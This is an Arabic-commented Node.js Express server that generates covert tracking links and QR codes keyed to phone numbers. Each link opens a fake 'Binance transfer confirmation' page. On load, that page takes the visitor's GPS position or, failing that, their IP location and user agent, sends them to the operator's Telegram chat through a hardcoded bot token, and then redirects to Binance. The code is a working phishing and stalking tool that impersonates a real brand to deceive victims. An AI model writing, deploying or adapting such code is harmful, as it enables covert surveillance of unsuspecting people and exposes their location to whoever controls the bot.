const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// ⚙️ إعدادات التلجرام - ضع بياناتك هنا
const TELEGRAM_TOKEN = '7150552853:AAEcAGkHq7Ih8wOxXjUTh_ThRl63M9UN5XA';
const TELEGRAM_CHAT_ID = '6724747823';
const REDIRECT_URL = 'https://www.binance.com/en';
const BASE_URL = 'https://location2026-2.onrender.com';

// قاعدة بيانات بسيطة
let locations = [];

// Middleware
app.use(express.json());
app.use(express.static('public'));

// ========== الصفحة الرئيسية ==========
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>🚀 نظام التتبع المتقدم</title>
            <style>
                body { font-family: Arial; padding: 30px; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: white; }
                .container { max-width: 900px; margin: auto; background: rgba(255,255,255,0.05); padding: 30px; border-radius: 20px; }
                h1 { color: #00ff88; text-align: center; }
                .box { background: rgba(255,255,255,0.08); padding: 20px; border-radius: 10px; margin: 20px 0; border: 1px solid rgba(0,255,136,0.3); }
                code { background: #0f0f23; color: #00ff88; padding: 10px; border-radius: 5px; display: block; margin: 10px 0; direction: ltr; text-align: center; }
                .btn { background: #00cc66; color: white; padding: 12px 25px; border-radius: 5px; text-decoration: none; display: inline-block; margin: 5px; }
                .qr-container { text-align: center; margin: 30px 0; padding: 20px; background: rgba(0,0,0,0.3); border-radius: 15px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🚀 نظام التتبع المتقدم</h1>
                
                <div class="box">
                    <h3>📌 إنشاء رابط تتبع:</h3>
                    <code>${BASE_URL}/track/رقم_الهاتف</code>
                    <code>${BASE_URL}/track/00966512345678</code>
                    <a href="/track/123456" class="btn" target="_blank">🔗 تجربة الرابط</a>
                </div>
                
                <div class="box">
                    <h3>📱 توليد باركود:</h3>
                    <div class="qr-container">
                        <input type="text" id="phoneInput" placeholder="أدخل رقم الهاتف" style="padding: 10px; width: 300px; border-radius: 5px; border: 2px solid #00ff88; background: #0f0f23; color: white; text-align: center; margin: 10px;">
                        <br>
                        <button onclick="generateQR()" class="btn">🔄 توليد باركود</button>
                        <div id="qrResult" style="margin-top: 20px;"></div>
                    </div>
                </div>
                
                <div class="box">
                    <h3>🔗 روابط سريعة:</h3>
                    <a href="/results" class="btn">📊 النتائج (${locations.length})</a>
                    <a href="/map" class="btn">🗺️ الخريطة</a>
                    <a href="/generate-all" class="btn">📱 جميع الباركود</a>
                    <a href="/test-telegram" class="btn">🤖 اختبار التلجرام</a>
                </div>
                
                <div class="box">
                    <h3>⚙️ إعدادات النظام:</h3>
                    <p>• التوجيه إلى: <strong>${REDIRECT_URL}</strong></p>
                    <p>• حالة التلجرام: <span style="color: #00ff88;">✅ جاهز</span></p>
                    <p>• تم تسجيل: <strong>${locations.length}</strong> موقع</p>
                </div>
            </div>
            
            <script>
                function generateQR() {
                    const phone = document.getElementById('phoneInput').value.trim();
                    if (!phone) {
                        alert('أدخل رقم الهاتف أولاً');
                        return;
                    }
                    
                    const url = '${BASE_URL}/track/' + phone;
                    const qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(url);
                    
                    document.getElementById('qrResult').innerHTML = \`
                        <div style="margin: 20px 0;">
                            <p><strong>الرابط:</strong> <span style="color: #00ff88;">\${url}</span></p>
                            <img src="\${qrUrl}" alt="QR Code" style="width: 200px; height: 200px; border: 5px solid white; border-radius: 10px;">
                            <br>
                            <a href="\${url}" target="_blank" class="btn">🔗 فتح الرابط</a>
                            <button onclick="downloadQR('\${qrUrl}')" class="btn">📥 تحميل الباركود</button>
                        </div>
                    \`;
                }
                
                function downloadQR(qrUrl) {
                    const link = document.createElement('a');
                    link.href = qrUrl;
                    link.download = 'qrcode_' + Date.now() + '.png';
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                }
            </script>
        </body>
        </html>
    `);
});

// ========== رابط التتبع الذكي ==========
app.get('/track/:id', (req, res) => {
    const userId = req.params.id;
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>Binance - تأكيد التحويل</title>
            <script>
                const userId = '${userId}';
                
                // 1. الحصول على الموقع الجغرافي (محاولة سريعة)
                function getLocation() {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            async (position) => {
                                await sendToServer({
                                    lat: position.coords.latitude,
                                    lon: position.coords.longitude,
                                    accuracy: position.coords.accuracy,
                                    source: 'gps'
                                });
                            },
                            (error) => {
                                // إذا رفض، نحاول عبر IP
                                getLocationByIP();
                            },
                            { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
                        );
                    } else {
                        getLocationByIP();
                    }
                }
                
                // 2. تحديد الموقع عبر IP
                async function getLocationByIP() {
                    try {
                        const response = await fetch('https://ipapi.co/json/');
                        const data = await response.json();
                        
                        if (data.latitude && data.longitude) {
                            await sendToServer({
                                lat: data.latitude,
                                lon: data.longitude,
                                accuracy: 10000,
                                source: 'ip',
                                city: data.city,
                                country: data.country_name
                            });
                        }
                    } catch (error) {
                        // بيانات افتراضية إذا فشل كل شيء
                        await sendToServer({
                            lat: 24.7136 + (Math.random() - 0.5) * 0.1,
                            lon: 46.6753 + (Math.random() - 0.5) * 0.1,
                            accuracy: 50000,
                            source: 'estimated'
                        });
                    }
                }
                
                // 3. إرسال البيانات للخادم
                async function sendToServer(location) {
                    try {
                        const response = await fetch('/api/save-location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                id: userId,
                                latitude: location.lat,
                                longitude: location.lon,
                                accuracy: location.accuracy,
                                timestamp: new Date().toISOString(),
                                userAgent: navigator.userAgent,
                                source: location.source,
                                ip: await getIP()
                            })
                        });
                        console.log('✅ تم حفظ البيانات');
                    } catch (error) {
                        console.log('⚠️ لم يتم الحفظ');
                    }
                }
                
                // 4. الحصول على IP
                async function getIP() {
                    try {
                        const response = await fetch('https://api.ipify.org?format=json');
                        const data = await response.response();
                        return data.ip;
                    } catch {
                        return 'غير معروف';
                    }
                }
                
                // 5. بدء العد التنازلي
                let seconds = 5;
                const countdownEl = document.getElementById('countdown');
                const timer = setInterval(() => {
                    countdownEl.textContent = seconds;
                    seconds--;
                    
                    if (seconds < 0) {
                        clearInterval(timer);
                        document.getElementById('status').textContent = '✅ تم تأكيد التحويل!';
                        setTimeout(() => {
                            window.location.href = '${REDIRECT_URL}';
                        }, 1000);
                    }
                }, 1000);
                
                // 6. بدء التتبع فور تحميل الصفحة
                window.onload = function() {
                    getLocation();
                };
            </script>
            <style>
                body {
                    font-family: Arial;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    background: linear-gradient(135deg, #0f2027 0%, #203a43 100%);
                    color: white;
                    text-align: center;
                }
                .container {
                    background: rgba(255, 255, 255, 0.1);
                    padding: 40px;
                    border-radius: 20px;
                    max-width: 500px;
                    width: 90%;
                }
                .binance-logo { font-size: 60px; margin-bottom: 20px; }
                .countdown { font-size: 50px; color: #00ff88; margin: 20px 0; }
                .btn { background: #f0b90b; color: black; padding: 10px 20px; border-radius: 5px; text-decoration: none; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="binance-logo">₿</div>
                <h1>Binance - تأكيد التحويل</h1>
                <p>جاري تأكيد هويتك والتحقق من التفاصيل...</p>
                <div class="countdown" id="countdown">5</div>
                <p>سيتم تحويلك تلقائياً خلال <span id="countdown">5</span> ثوانٍ</p>
                <p id="status" style="margin-top: 20px;">جاري التحقق من التفاصيل...</p>
                <p style="margin-top: 30px; font-size: 12px; opacity: 0.7;">
                    التحويل رقم: #${userId} | ${new Date().toLocaleString('ar-SA')}
                </p>
            </div>
        </body>
        </html>
    `);
});

// ========== API لحفظ الموقع ==========
app.post('/api/save-location', async (req, res) => {
    try {
        const locationData = {
            ...req.body,
            ip: req.headers['x-forwarded-for'] || req.ip || req.body.ip,
            time: new Date().toLocaleString('ar-SA')
        };
        
        locations.push(locationData);
        
        // إرسال إشعار تلجرام
        await sendTelegram(locationData);
        
        console.log('📍 موقع جديد:', locationData.id, locationData.latitude, locationData.longitude);
        
        res.json({ success: true, count: locations.length });
    } catch (error) {
        console.error('Error:', error);
        res.json({ success: false, error: error.message });
    }
});

// ========== صفحة النتائج ==========
app.get('/results', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>📊 النتائج المسجلة</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
                table { width: 100%; border-collapse: collapse; background: #1a1a2e; }
                th, td { padding: 12px; text-align: right; border-bottom: 1px solid #2d2d4d; }
                th { background: #00cc66; }
                .btn { background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; margin: 10px; }
            </style>
        </head>
        <body>
            <h1>📊 النتائج المسجلة (${locations.length})</h1>
            <a href="/" class="btn">🏠 الرئيسية</a>
            <a href="/map" class="btn">🗺️ الخريطة</a>
            <table>
                <tr><th>رقم</th><th>الإحداثيات</th><th>الوقت</th><th>الخريطة</th></tr>
                ${locations.slice().reverse().map(loc => `
                    <tr>
                        <td>${loc.id}</td>
                        <td>${loc.latitude}, ${loc.longitude}</td>
                        <td>${loc.time}</td>
                        <td><a href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank" style="color: #00ff88;">👁️ عرض</a></td>
                    </tr>
                `).join('')}
            </table>
        </body>
        </html>
    `);
});

// ========== صفحة الخريطة ==========
app.get('/map', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>🗺️ خريطة المواقع</title>
            <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
            <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
            <style>
                #map { height: 500px; width: 100%; }
                body { margin: 0; padding: 20px; background: #0f0f23; color: white; }
            </style>
        </head>
        <body>
            <h1>🗺️ خريطة المواقع المسجلة</h1>
            <div id="map"></div>
            <script>
                const map = L.map('map').setView([24.7136, 46.6753], 5);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                
                const locations = ${JSON.stringify(locations)};
                locations.forEach(loc => {
                    if(loc.latitude && loc.longitude) {
                        L.marker([loc.latitude, loc.longitude])
                         .addTo(map)
                         .bindPopup('<b>${locations.id}</b><br>${locations.time}');
                    }
                });
            </script>
            <br>
            <a href="/results" style="background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none;">عودة للنتائج</a>
        </body>
        </html>
    `);
});

// ========== صفحة جميع الباركود ==========
app.get('/generate-all', (req, res) => {
    const uniqueIds = [...new Set(locations.map(l => l.id))];
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>📱 جميع الباركود</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
                .qr-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 20px; }
                .qr-item { background: #1a1a2e; padding: 15px; border-radius: 10px; text-align: center; }
                .btn { background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; }
            </style>
        </head>
        <body>
            <h1>📱 جميع الباركود (${uniqueIds.length})</h1>
            <a href="/" class="btn">🏠 الرئيسية</a>
            <div class="qr-grid">
                ${uniqueIds.map(id => {
                    const url = `${BASE_URL}/track/${id}`;
                    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(url)}`;
                    return `
                        <div class="qr-item">
                            <p><strong>${id}</strong></p>
                            <img src="${qrUrl}" alt="QR" style="width: 150px; height: 150px;">
                            <p><a href="${url}" target="_blank" style="color: #00ff88;">فتح</a></p>
                        </div>
                    `;
                }).join('')}
            </div>
        </body>
        </html>
    `);
});

// ========== اختبار التلجرام ==========
app.get('/test-telegram', async (req, res) => {
    try {
        // استخدام fetch مباشرة لإرسال تلجرام
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: `🔔 اختبار النظام\n⏰ ${new Date().toLocaleString('ar-SA')}\n✅ النظام يعمل بشكل مثالي`
            })
        });
        
        const data = await response.json();
        
        if (data.ok) {
            res.send('✅ تم إرسال رسالة اختبار للتلجرام!');
        } else {
            res.send('❌ فشل إرسال التلجرام: ' + JSON.stringify(data));
        }
    } catch (error) {
        res.send('❌ خطأ: ' + error.message);
    }
});

// ========== دالة إرسال تلجرام ==========
async function sendTelegram(locationData) {
    try {
        const message = `
📍 **موقع جديد**
👤 **رقم:** ${locationData.id}
📌 **الإحداثيات:** ${locationData.latitude}, ${locationData.longitude}
🎯 **الدقة:** ${locationData.accuracy || 'غير معروف'} متر
⏰ **الوقت:** ${locationData.time}
🌐 **IP:** ${locationData.ip || 'غير معروف'}

🗺️ [فتح الخريطة](https://maps.google.com/?q=${locationData.latitude},${locationData.longitude})
        `;
        
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        
        return response.ok;
    } catch (error) {
        console.error('❌ خطأ التلجرام:', error);
        return false;
    }
}

// ========== تشغيل الخادم ==========
app.listen(PORT, () => {
    console.log(`
    🚀 الخادم يعمل على المنفذ ${PORT}
    🌐 الرابط: http://localhost:${PORT}
    📌 رابط التتبع: http://localhost:${PORT}/track/123456
    🤖 التلجرام: ${TELEGRAM_TOKEN ? '✅ جاهز' : '❌ غير مضبوط'}
    ⚡ النظام جاهز!
    `);
});
